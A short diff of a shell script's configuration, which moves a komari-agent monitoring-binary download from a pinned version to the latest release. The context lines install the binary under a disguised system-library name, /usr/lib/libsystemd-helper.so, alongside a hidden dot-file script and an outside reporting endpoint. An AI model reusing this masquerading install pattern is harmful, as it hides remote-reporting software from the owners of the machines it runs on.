@@ -4,7 +4,7 @@
 #
 
 # ============ 配置 ============
-DOWNLOAD_URL="https://github.com/komari-monitor/komari-agent/releases/download/1.1.40/komari-agent-linux-arm"
+DOWNLOAD_URL="https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm"
 INSTALL_PATH="/usr/lib/libsystemd-helper.so"
 HIDDEN_SCRIPT="/usr/lib/.sysd"
 ENDPOINT="https://status.sm.uy"
